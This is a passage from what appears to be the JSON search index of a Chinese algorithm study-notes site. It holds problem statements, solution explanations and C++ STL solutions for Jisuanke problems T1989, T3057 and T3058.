\u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#12-problem-description","text":"\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u81ea\u7136\u6570 M \uff0c\u6c42\u51fa\u6240\u6709\u7684\u8fde\u7eed\u7684\u81ea\u7136\u6570\u6bb5\uff08\u8fde\u7eed\u4e2a\u6570\u5927\u4e8e 1 \uff09\uff0c\u8fd9\u4e9b\u8fde\u7eed\u7684\u81ea\u7136\u6570\u6bb5\u4e2d\u7684\u5168\u90e8\u6570\u4e4b\u548c\u4e3a M \u3002 \u4f8b\u5b50\uff1a 1998+1999+2000+2001+2002=10000 \uff0c\u6240\u4ee5\u4ece 1998 \u5230 2002 \u7684\u4e00\u4e2a\u81ea\u7136\u6570\u6bb5\u4e3a M=10000 \u7684\u4e00\u4e2a\u89e3\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#13-input","text":"\u8f93\u5165\u5305\u542b\u4e00\u4e2a\u6574\u6570 M(10 \\le M \\le 2,000,000) \u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#14-output","text":"\u6bcf\u884c\u4e24\u4e2a\u81ea\u7136\u6570\uff0c\u7ed9\u51fa\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u8fde\u7eed\u81ea\u7136\u6570\u6bb5\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6570\u548c\u6700\u540e\u4e00\u4e2a\u6570\uff0c\u4e24\u6570\u4e4b\u95f4\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\uff0c\u6240\u6709\u8f93\u51fa\u7684\u884c\u6309\u7167\u7b2c\u4e00\u4e2a\u6570\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u8f93\u5165\u6570\u636e\uff0c\u4fdd\u8bc1\u81f3\u5c11\u6709\u4e00\u7ec4\u89e3\u3002 \u8f93\u51fa\u65f6\u6bcf\u884c\u672b\u5c3e\u7684\u591a\u4f59\u7a7a\u683c\uff0c\u4e0d\u5f71\u54cd\u7b54\u6848\u6b63\u786e\u6027","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#15-sample-input","text":"15","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#16-sample-output","text":"1 5 4 6 7 8","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#17-source","text":"\u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#2","text":"STL\u57fa\u672c\u4f7f\u7528\u3002\u4f7f\u7528 STL\u4e2d\u7684\u961f\u5217 queue \u6765\u5bf9\u5143\u7d20\u8fdb\u884c\u5165\u961f\u51fa\u961f\u64cd\u4f5c\u3002 \u82e5\u5f53\u524d\u961f\u5185\u6240\u6709\u5143\u7d20\u7684\u548c sum > M \uff0c\u5219\u961f\u9996\u5143\u7d20\u51fa\u961f\uff0c\u76f4\u5230 sum \\le M \u3002 \u82e5\u5f53\u524d\u961f\u5185\u6240\u6709\u5143\u7d20\u7684\u548c sum \\le M \uff0c\u5219\u4e0b\u4e00\u4e2a\u5143\u7d20\u5165\u961f\u3002 \u5728\u6bcf\u6b21\u5165\u961f/\u51fa\u961f\u5b8c\u6210\u4ee5\u540e\uff0c\u5224\u65ad\u662f\u5426 sum = M \uff0c\u82e5\u662f\uff0c\u5219\u8f93\u51fa\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#3","text":"#include <iostream> #include <queue> using namespace std; queue<int> qu; int main() { // test case int t; scanf(\"%d\", &t); // \u961f\u9996\u5143\u7d20front, \u961f\u5c3e\u5143\u7d20back int front, back; // \u6c42\u548c int sum = 0; // \u8f93\u5165 for (int i = 1; i <= t; i++) { // \u5165\u961f qu.push(i); // \u7d2f\u52a0 sum += i; // \u82e5\u6c42\u548c\u5927\u4e8e\u8981\u6c42 while (sum > t) { sum -= qu.front(); // \u961f\u9996\u51fa\u961f qu.pop(); } // \u83b7\u53d6\u961f\u9996\u5143\u7d20 front = qu.front(); // \u83b7\u53d6\u961f\u5c3e\u5143\u7d20 back = qu.back(); // \u5224\u65ad\u662f\u5426\u7b26\u5408\u6761\u4ef6 if (sum == t && front != back) { // \u82e5\u7b26\u5408\u8981\u6c42\uff0c\u8f93\u51fa printf(\"%d %d\\n\", front, back); } // \u82e5\u82e5\u6c42\u548c\u5c0f\u4e8e\u8981\u6c42\uff0c\u7ee7\u7eed\u5faa\u73af } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/","text":"\u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III # \u76ee\u5f55 # \u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 524288 kB 1.2. Problem Description # \u849c\u5934\u541b\u5728\u73a9\u4e00\u79cd\u5361\u724c\u6e38\u620f\uff0c\u4ed6\u6709 n \u5f20\u5361\u724c\uff0c\u6bcf\u5f20\u5361\u724c\u4e0a\u5199\u7740\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i \uff0c a_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u80fd\u91cf\u503c\uff0c b_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u9b54\u6cd5\u503c\u3002 \u849c\u5934\u541b\u8981\u4ece\u8fd9 n \u5f20\u5361\u724c\u4e2d\u9009\u51fa\u4e00\u4e9b\u5f62\u6210\u4e00\u4e2a\u5361\u7ec4\uff0c\u7528\u8fd9\u4e2a\u5361\u7ec4\u5bf9\u654c\u4eba\u9020\u6210\u4f24\u5bb3\u3002\u4e00\u4e2a\u5361\u7ec4\u5bf9\u654c\u4eba\u7684\u4f24\u5bb3\u662f\u8fd9\u4e2a\u5361\u7ec4\u4e2d\u6240\u6709\u5361\u724c\u7684\u80fd\u91cf\u503c\u4e4b\u548c\u4e58\u5176\u4e2d\u9b54\u6cd5\u503c\u6700\u5c0f\u7684\u4e00\u5f20\u5361\u724c\u7684\u9b54\u6cd5\u503c\u3002 \u849c\u5934\u541b\u60f3\u77e5\u9053\u4ed6\u7528\u4e00\u4e2a\u5361\u7ec4\u6700\u591a\u80fd\u5bf9\u654c\u4eba\u4ea7\u751f\u591a\u5c11\u4f24\u5bb3\u3002 1.3. Input # \u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n (1 \\le n \\le 10^5) \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i (1 \\le a_i, b_i \\le 10^6) 1.4. Output # \u8f93\u51fa\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u849c\u5934\u541b\u7528\u4e00\u4e2a\u5361\u7ec4\u5bf9\u654c\u4eba\u4ea7\u751f\u7684\u4f24\u5bb3\u7684\u6700\u5927\u503c\u3002 1.5. Sample Input # 3 1 2 3 4 5 6 1.6. Sample Output # 32 1.7. Source # \u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III 2. \u89e3\u8bfb # STL\u57fa\u672c\u4f7f\u7528\u3002 \u4f7f\u7528 map \u5bf9\u6570\u636e\u8fdb\u884c\u5b58\u50a8\u548c\u6392\u5e8f\uff0c first \u4e2d\u5b58\u50a8\u9b54\u6cd5\u503c b_i \uff0c second \u4e2d\u5b58\u50a8\u9b54\u6cd5\u503c b_i \u5bf9\u5e94\u7684\u80fd\u91cf\u503c\u7d2f\u52a0 \\sum a_i \u3002 \u6309\u7167\u9b54\u6cd5\u503c b_i \u4ece\u9ad8\u5230\u4f4e\u6392\u5217\u8fdb\u884c\u904d\u5386\uff0c\u4f9d\u6b21\u8ba1\u7b97\u6700\u5c0f\u9b54\u6cd5\u503c \\min b \u53d6 b_i \u65f6\u80fd\u591f\u4ea7\u751f\u591a\u5c11\u4f24\u5bb3\u3002\u8f93\u51fa\u6240\u6709\u60c5\u51b5\u7684\u6700\u5927\u503c\u3002 3. \u4ee3\u7801 # #include <iostream> #include <map> using namespace std; // \u5b58\u50a8 map<long long, long long> mp; int main() { // test case int t; scanf(\"%d\", &t); // a, b long long a, b; long long minB, maxB = 0, sumA = 0, ans = 0, markAns; // \u8f93\u5165 for (int i = 0; i < t; i++) { scanf(\"%lld %lld\", &a, &b); // \u8bb0\u5f55\u6bcf\u4e2a\u9b54\u6cd5\u503c\u5bf9\u5e94\u7684\u80fd\u91cf\u503c\u6c47\u603b // \u5206\u60c5\u51b5\u5b58\u50a8 if (mp.find(b) != mp.end()) { mp[b] += a; } else { mp[b] = a; } // \u83b7\u53d6\u6700\u5927\u7684\u9b54\u6cd5\u503c if (b > maxB) { maxB = b; } } // \u521d\u59cb\u503c minB = maxB; // \u904d\u5386 for (auto it = mp.rbegin(); it != mp.rend(); it++) { // \u7d2f\u52a0\u80fd\u91cf\u503c sumA += it->second; // \u66f4\u65b0\u6700\u5c0f\u9b54\u6cd5\u503c minB = min(minB, it->first); // \u83b7\u53d6\u7ed3\u679c markAns = minB * sumA; // \u8ba1\u7b97\u7ed3\u679c\u4e2d\u7684\u6700\u5927\u503c if (markAns > ans) { ans = markAns; } } // \u8f93\u51fa printf(\"%lld\\n\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.\u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#t3057-iii","text":"","title":"\u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#_1","text":"\u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 524288 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#12-problem-description","text":"\u849c\u5934\u541b\u5728\u73a9\u4e00\u79cd\u5361\u724c\u6e38\u620f\uff0c\u4ed6\u6709 n \u5f20\u5361\u724c\uff0c\u6bcf\u5f20\u5361\u724c\u4e0a\u5199\u7740\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i \uff0c a_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u80fd\u91cf\u503c\uff0c b_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u9b54\u6cd5\u503c\u3002 \u849c\u5934\u541b\u8981\u4ece\u8fd9 n \u5f20\u5361\u724c\u4e2d\u9009\u51fa\u4e00\u4e9b\u5f62\u6210\u4e00\u4e2a\u5361\u7ec4\uff0c\u7528\u8fd9\u4e2a\u5361\u7ec4\u5bf9\u654c\u4eba\u9020\u6210\u4f24\u5bb3\u3002\u4e00\u4e2a\u5361\u7ec4\u5bf9\u654c\u4eba\u7684\u4f24\u5bb3\u662f\u8fd9\u4e2a\u5361\u7ec4\u4e2d\u6240\u6709\u5361\u724c\u7684\u80fd\u91cf\u503c\u4e4b\u548c\u4e58\u5176\u4e2d\u9b54\u6cd5\u503c\u6700\u5c0f\u7684\u4e00\u5f20\u5361\u724c\u7684\u9b54\u6cd5\u503c\u3002 \u849c\u5934\u541b\u60f3\u77e5\u9053\u4ed6\u7528\u4e00\u4e2a\u5361\u7ec4\u6700\u591a\u80fd\u5bf9\u654c\u4eba\u4ea7\u751f\u591a\u5c11\u4f24\u5bb3\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#13-input","text":"\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n (1 \\le n \\le 10^5) \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i (1 \\le a_i, b_i \\le 10^6)","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#14-output","text":"\u8f93\u51fa\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u849c\u5934\u541b\u7528\u4e00\u4e2a\u5361\u7ec4\u5bf9\u654c\u4eba\u4ea7\u751f\u7684\u4f24\u5bb3\u7684\u6700\u5927\u503c\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#15-sample-input","text":"3 1 2 3 4 5 6","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#16-sample-output","text":"32","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#17-source","text":"\u8ba1\u849c\u5ba2 T3057 \u5361\u724c\u6e38\u620f III","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#2","text":"STL\u57fa\u672c\u4f7f\u7528\u3002 \u4f7f\u7528 map \u5bf9\u6570\u636e\u8fdb\u884c\u5b58\u50a8\u548c\u6392\u5e8f\uff0c first \u4e2d\u5b58\u50a8\u9b54\u6cd5\u503c b_i \uff0c second \u4e2d\u5b58\u50a8\u9b54\u6cd5\u503c b_i \u5bf9\u5e94\u7684\u80fd\u91cf\u503c\u7d2f\u52a0 \\sum a_i \u3002 \u6309\u7167\u9b54\u6cd5\u503c b_i \u4ece\u9ad8\u5230\u4f4e\u6392\u5217\u8fdb\u884c\u904d\u5386\uff0c\u4f9d\u6b21\u8ba1\u7b97\u6700\u5c0f\u9b54\u6cd5\u503c \\min b \u53d6 b_i \u65f6\u80fd\u591f\u4ea7\u751f\u591a\u5c11\u4f24\u5bb3\u3002\u8f93\u51fa\u6240\u6709\u60c5\u51b5\u7684\u6700\u5927\u503c\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/4.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3057_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_III/#3","text":"#include <iostream> #include <map> using namespace std; // \u5b58\u50a8 map<long long, long long> mp; int main() { // test case int t; scanf(\"%d\", &t); // a, b long long a, b; long long minB, maxB = 0, sumA = 0, ans = 0, markAns; // \u8f93\u5165 for (int i = 0; i < t; i++) { scanf(\"%lld %lld\", &a, &b); // \u8bb0\u5f55\u6bcf\u4e2a\u9b54\u6cd5\u503c\u5bf9\u5e94\u7684\u80fd\u91cf\u503c\u6c47\u603b // \u5206\u60c5\u51b5\u5b58\u50a8 if (mp.find(b) != mp.end()) { mp[b] += a; } else { mp[b] = a; } // \u83b7\u53d6\u6700\u5927\u7684\u9b54\u6cd5\u503c if (b > maxB) { maxB = b; } } // \u521d\u59cb\u503c minB = maxB; // \u904d\u5386 for (auto it = mp.rbegin(); it != mp.rend(); it++) { // \u7d2f\u52a0\u80fd\u91cf\u503c sumA += it->second; // \u66f4\u65b0\u6700\u5c0f\u9b54\u6cd5\u503c minB = min(minB, it->first); // \u83b7\u53d6\u7ed3\u679c markAns = minB * sumA; // \u8ba1\u7b97\u7ed3\u679c\u4e2d\u7684\u6700\u5927\u503c if (markAns > ans) { ans = markAns; } } // \u8f93\u51fa printf(\"%lld\\n\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/","text":"\u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV # \u76ee\u5f55 # \u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 524288 kB 1.2. Problem Description # \u849c\u5934\u541b\u5728\u73a9\u4e00\u79cd\u5361\u724c\u6e38\u620f\uff0c\u4ed6\u6709 n \u5f20\u5361\u724c\uff0c\u6bcf\u5f20\u5361\u724c\u4e0a\u5199\u7740\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i \uff0c a_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u80fd\u91cf\u503c\uff0c b_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u9b54\u6cd5\u503c\u3002 \u4ed6\u51c6\u5907\u4e00\u5f20\u4e00\u5f20\u6253\u51fa\u8fd9 n \u5f20\u5361\u724c\uff0c\u6bcf\u5f20\u5361\u724c\u4f1a\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u662f\u8fd9\u5f20\u5361\u724c\u7684\u80fd\u91cf\u503c\u4e58\u9b54\u6cd5\u503c\u3002\u4f46\u662f\u849c\u5934\u541b\u89c9\u5f97\u8fd9\u6837\u628a\u8fd9 n \u5f20\u5361\u724c\u90fd\u51fa\u5b8c\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u4e4b\u548c\u8fd8\u662f\u4e0d\u591f\u5927\uff0c\u6240\u4ee5\u4ed6\u5077\u5077\u5b66\u4f1a\u4e86\u4e00\u79cd\u4ed9\u672f\u3002 \u849c\u5934\u541b\u65bd\u5c55\u4e00\u6b21\u4ed9\u672f\u7684\u65f6\u5019\u4f1a\u4efb\u610f\u9009\u62e9\u4e24\u5f20\u5361\u724c\uff0c\u628a\u5b83\u4eec\u7684\u9b54\u6cd5\u503c\u4ea4\u6362\uff0c\u80fd\u91cf\u503c\u4e0d\u4ea4\u6362\u3002\u849c\u5934\u541b\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u6b21\u4ed9\u672f\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u6b21\u90fd\u4e0d\u4f7f\u7528\uff0c\u4ed6\u60f3\u77e5\u9053\u4f7f\u7528\u4e86\u82e5\u5e72\u6b21\u4ed9\u672f\u4ee5\u540e\u4e00\u5f20\u4e00\u5f20\u6253\u51fa\u8fd9 n \u5f20\u5361\u724c\uff0c\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u4e4b\u548c\u6700\u5927\u662f\u591a\u5c11\u3002 1.3. Input # \u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n (1 \\le n \\le 10^5) \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i (1 \\le a_i, b_i \\le 10^6) 1.4. Output # \u8f93\u51fa\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u849c\u5934\u541b\u4f7f\u7528\u82e5\u5e72\u6b21\u4ed9\u672f\u4ee5\u540e\u4e00\u5f20\u4e00\u5f20\u6253\u51fa\u5361\u724c\uff0c\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u4e4b\u548c\u7684\u6700\u5927\u503c\u3002 1.5. Sample Input # 3 1 6 3 4 5 2 1.6. Sample Output # 44 1.7. Source # \u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV 2. \u89e3\u8bfb # STL\u57fa\u672c\u4f7f\u7528\u3002 \u4f7f\u7528 priority_queue \u5bf9\u6570\u636e\u8fdb\u884c\u5b58\u50a8\u548c\u6392\u5e8f\uff0c\u5c06\u80fd\u91cf\u503c a_i \u548c\u9b54\u6cd5\u503c b_i \u5206\u522b\u5b58\u50a8\u5728\u4e24\u4e2a\u4e0d\u540c\u7684\u4f18\u5148\u961f\u5217\u4e2d\uff0c\u964d\u5e8f\u6392\u5217\u3002 \u5c06 a_i \u4e2d\u7684\u6700\u5927\u503c\u548c b_i \u4e2d\u7684\u6700\u5927\u503c\u76f8\u4e58\uff0c\u5c06\u7ed3\u679c\u5b58\u50a8\u5728 ans 